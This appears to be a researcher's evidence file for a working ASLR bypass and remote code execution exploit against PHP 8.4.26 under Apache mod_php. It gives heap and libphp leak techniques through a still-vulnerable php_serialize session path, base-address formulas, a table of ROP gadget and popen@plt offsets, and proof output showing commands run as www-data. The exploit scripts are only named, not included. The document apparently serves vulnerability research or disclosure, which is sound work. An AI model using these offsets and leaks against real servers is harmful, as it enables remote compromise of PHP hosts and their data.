# ASLR bypass evidence (PHP 8.4.26 / Apache mod_php)

## Environment

```text
personality = 00000000   # ASLR enabled
Apache 2.4.68 prefork, single worker
PHP 8.4.26 (source build, libphp.so)
```

## Leak 1: Zend MM chunk base

`/leak.php` returns 929 bytes, of which the 775 bytes after `s:775:"` contain
heap pointers.

ASLR measurements:

```text
first ptrs: 0x7fd3e62013a0, 0x7fd3e62013c0, ...
masked bases: 0x7fd3e6200000 (48 pointers)
```

`/proc/<child>/maps`:

```text
7fd3e6200000-7fd3e6400000 rw-p 00000000 00:00 0
```

Both agree (a 2MB-aligned Zend MM chunk).

## Leak 2: libphp base

`/leak_libc.php?mode=file_first` returns 32815 bytes, of which the 32768 bytes
after `s:32768:"` are a controlled-length OOB read.

ASLR measurements:

```text
payload offset 0x1fe8 = 0x7fd3e7fb6309
libphp_base = 0x7fd3e7fb6309 - 0x5b6309 = 0x7fd3e7a00000
```

`/proc/<child>/maps`:

```text
7fd3e7a00000-7fd3e7b4f000 r--p 00000000 ... /usr/lib/apache2/modules/libphp.so
```

Fully consistent.

## Complete ASLR exploit

Current master (personality=0):

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(3/3 consecutive)
```

After restarting the Apache master:

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(2/2 consecutive)
```

## Key formulas/offsets (this build)

| Item | Value |
|---|---|
| heap chunk base | `mode(leaked_ptr & ~0x1fffff)` |
| libphp base | `qword(payload[0x1fe8]) - 0x5b6309` |
| S of the exploit request | `chunk_base + 0x3780` |
| `leave; ret` | libphp + `0x21ef23` |
| `pop rdi; ret` | libphp + `0x15e492` |
| `pop rsi; ret` | libphp + `0x15d1a3` |
| `ret` (alignment) | libphp + `0x15a029` |
| `popen@plt` | libphp + `0x1504d0` |
| `exit@plt` | libphp + `0x155780` |

## Scripts

- `tools/leak.php`
- `tools/leak_libc.php`
- `tools/dyn_payload.php`
- `tools/aslr_run2.py`

## Notes

- The default `session.serialize_handler=php` has been fixed in GH-16590; the
  leak uses the `php_serialize` sibling path (still vulnerable in 8.4.26).
- `S_OFF=0x3780` is the measured value for "after two leak requests, the
  `dyn_payload.php` request"; changing the request order/scripts requires
  recalibration.
- Under the same Apache master, hb/lb do not change after workers are
  recreated (prefork inherits the mappings); after the master restarts they
  change, and the leak adapts automatically.
